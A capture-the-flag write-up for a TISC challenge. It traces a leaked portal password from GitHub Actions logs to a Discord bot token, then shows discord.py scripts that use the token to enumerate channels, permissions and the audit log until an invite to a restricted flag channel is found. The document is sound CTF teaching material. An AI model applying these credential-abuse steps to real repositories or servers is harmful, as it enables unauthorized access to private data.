I looked through all the information on github. The first thing I checked, of course, was the code in the repository. There was only one file, under .github/workflows

```yml:test_portal.yml
name: Test the PALINDROME portal

on:
    issues:
        types: [closed]

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Test the PALINDROME portal
        run: | 
          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
          cat test
```

I looked through the branches and commit history, but there was nothing interesting there. There seemed to be a few issues and pull requests, but I soon realised that these were created by other participants. Then I moved to the actions tab, and found the `Portal opening` job triggered by palindrome-wow, and saw interesting stuff in the logs:

![portal opening logs](/palindromes-invitation-gh-log.png)

It seems that the `PORTAL_URL` and `PORTAL_PASSWORD` have been leaked in the logs. Although `PORTAL_URL` is redacted, we can see there was an attempt to connect to 18.143.127.62:45938. Accessing this in the browser, we are greeted with a login page:

![palindrome portal](/palindromes-invitation-portal.png)

I tried submitting `:dIcH:..uU9gp1%3C@%3C3Q%22DBM5F%3C)64S%3C(01tF(Jj%25ATV@$Gl` as the password, but this didn't work. But after putting this value into CyberChef, I realised it was the base85 encoded and url encoded string `"PALINDROME has an AUTOMATED secretary"`. It turned out that the correct password was base85 encoded value, `":dIcH:..uU9gp1<@<3Q"DBM5F<)64S<(01tF(Jj%ATV@$Gl"`. After entering this in, I am presented with a discord invite link, with some token in the comments:

```html
<body>
  <a href="https://discord.gg/2cyZ6zpw7J">Welcome!</a>
  <!-- MTEyNTk4MjE2NjM3MTc5NDk5NQ.GEg0DH.bO_tBcJZEWJkaPd6ssIJKGLI_8TD4LY07D52RY -->
  <!-- You have 15 minutes before this token expires! Find a way to use it and be fast! You can always re-enter the password to get a new token, but please be considerate, it is highly limited. -->
</body>
```

When I joined the server from the link, there seemed to be no channels at all.

The token turned out to be the token for a discord bot. I used discord.py to interface with the bot, and first listed what text channels were available.

```python:t.py
import discord

TOKEN = "MTEyNTk4MjMyNzk1NzM3Mjk0OQ.G31hYi.oV4zE1q5lAvJ-jrFAIGiZYKoNpbAIofoYIIRis"

c = discord.Client()

@c.event
async def on_ready():
    print(c.guilds[0].text_channels)

c.run(TOKEN)
```

There were 3 channels, `general`, `meeting-records`, and `flag`. When I tried to access the `flag` channel, however, I found that I did not have permissions to read the chat history. Now, I thought it would be a good idea to list what permissions I had.

```python:t.py
...

def print_perms(perms):
    for p in dir(perms):
        if p[0] != '_' and not callable(getattr(perms, p)) and getattr(perms, p) == True:
            print(p)
    print()

@c.event
async def on_ready():
    g = c.guilds[0]
    print_perms(g.get_member(c.user.id).guild_permissions)
```

This gave the following list of permissions:

```plaintext
read_message_history
read_messages
view_audit_log
view_channel
```

I viewed the audit log with the following code:

```python
...

def print_obj(g):
    for a in dir(g):
        if a[0] != '_' and not callable(getattr(g, a)):
            print('\t' + a + ': ' + str(getattr(g, a)))
    print()

@c.event
async def on_ready():
    async for x in g.audit_logs(limit=None):
        print(x)
        continue
        print('-'*50)
        print_obj(x)
    print()
```

In the logs, I saw a few other participants had been granted the admin role by the BetterInvites bot. However, I was stuck here for a while and tried a bunch of other stuff before realising there were more invite links in the audit log.

```
...

<AuditLogEntry id=1149538180668858448 action=AuditLogAction.invite_create user=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False>>
--------------------------------------------------
	action: AuditLogAction.invite_create
	after: <AuditLogDiff code='HQvTm5DSTs' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=0 temporary=False flags=0>
	before: <AuditLogDiff code=None channel=None inviter=None uses=None max_uses=None max_age=None temporary=None flags=None>
	category: AuditLogActionCategory.create
	changes: <AuditLogChanges before=<AuditLogDiff code=None channel=None inviter=None uses=None max_uses=None max_age=None temporary=None flags=None> after=<AuditLogDiff code='HQvTm5DSTs' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=0 temporary=False flags=0>>
	created_at: 2023-09-08 02:54:19.658000+00:00
	extra: None
	guild: PALINDROME's secret chat room
	id: 1149538180668858448
	reason: None
	target: https://discord.gg/HQvTm5DSTs
	user: palindromewow
	user_id: 1130165088788168858

<AuditLogEntry id=1149538164214612129 action=AuditLogAction.invite_create user=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False>>
--------------------------------------------------
	action: AuditLogAction.invite_create
	after: <AuditLogDiff code='RBjatqsJ' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=604800 temporary=False flags=0>
	before: <AuditLogDiff code=None channel=None inviter=None uses=None max_uses=None max_age=None temporary=None flags=None>
	category: AuditLogActionCategory.create
	changes: <AuditLogChanges before=<AuditLogDiff code=None channel=None inviter=None uses=None max_uses=None max_age=None temporary=None flags=None> after=<AuditLogDiff code='RBjatqsJ' channel=<TextChannel id=1132170608013226084 name='flag' position=2 nsfw=False news=False category_id=1132169821623165142> inviter=<User id=1130165088788168858 name='palindromewow' global_name='PALINDROME' bot=False> uses=0 max_uses=0 max_age=604800 temporary=False flags=0>>
	created_at: 2023-09-08 02:54:15.735000+00:00
	extra: None
	guild: PALINDROME's secret chat room
	id: 1149538164214612129
	reason: None
	target: https://discord.gg/RBjatqsJ
	user: palindromewow
	user_id: 1130165088788168858

...
```

Joining using one of the invite links, I was able to access the flag channel and get the flag: `TISC{H4ppY_B1rThD4y_4nY4!}`